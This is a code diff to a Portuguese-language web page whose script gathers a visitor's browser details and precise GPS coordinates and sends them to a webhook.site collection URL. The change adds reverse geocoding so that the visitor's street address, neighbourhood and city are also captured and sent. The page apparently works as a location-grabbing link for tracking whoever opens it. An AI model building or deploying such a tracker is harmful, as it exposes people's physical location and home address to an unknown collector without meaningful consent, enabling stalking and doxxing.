@@ -2,10 +2,11 @@
 <html lang="pt-br">
 <head>
   <meta charset="UTF-8" />
-  <title>Captura de Localização</title>
+  <title>Captura de Localização com Endereço</title>
 </head>
 <body>
-  <h2>Capturando sua localização...</h2>
+  <h2>Capturando sua localização e endereço...</h2>
+  <pre id="resultado"></pre>
   <script>
     const webhookURL = 'https://webhook.site/d017525e-429c-422d-8a2a-50a497cf4c44';
 
@@ -17,30 +18,60 @@
       });
     }
 
-    function capturarInfo() {
+    async function getEndereco(lat, lon) {
+      try {
+        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=pt`);
+        const data = await response.json();
+        return data.address || {};
+      } catch {
+        return {};
+      }
+    }
+
+    async function capturarInfo() {
+      const resultadoEl = document.getElementById('resultado');
       const dados = {
         userAgent: navigator.userAgent,
         language: navigator.language,
         platform: navigator.platform,
-        // pode adicionar mais info que quiser
       };
 
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(position => {
+        navigator.geolocation.getCurrentPosition(async position => {
           dados.latitude = position.coords.latitude;
           dados.longitude = position.coords.longitude;
           dados.accuracy = position.coords.accuracy;
+
+          const endereco = await getEndereco(dados.latitude, dados.longitude);
+
+          dados.enderecoCompleto = endereco;
+
+          let enderecoTexto = '';
+          if (endereco) {
+            enderecoTexto += endereco.road ? endereco.road + ', ' : '';
+            enderecoTexto += endereco.neighbourhood ? endereco.neighbourhood + ', ' : '';
+            enderecoTexto += endereco.suburb ? endereco.suburb + ', ' : '';
+            enderecoTexto += endereco.city ? endereco.city + ', ' : '';
+            enderecoTexto += endereco.state ? endereco.state + ', ' : '';
+            enderecoTexto += endereco.country ? endereco.country : '';
+          }
+
+          resultadoEl.textContent = 
+            `Latitude: ${dados.latitude}\n` +
+            `Longitude: ${dados.longitude}\n` +
+            `Endereço: ${enderecoTexto}\n\n` +
+            `Dados enviados! Obrigado.`;
+
           enviarDados(dados);
-          document.body.innerHTML = "<h2>Dados enviados! Obrigado.</h2>";
         }, erro => {
           dados.error = erro.message;
           enviarDados(dados);
-          document.body.innerHTML = "<h2>Erro ao pegar localização, mas dados enviados.</h2>";
+          resultadoEl.textContent = "Erro ao pegar localização, mas dados enviados.";
         });
       } else {
         dados.error = "Geolocalização não suportada";
         enviarDados(dados);
-        document.body.innerHTML = "<h2>Seu navegador não suporta geolocalização.</h2>";
+        resultadoEl.textContent = "Seu navegador não suporta geolocalização.";
       }
     }
 
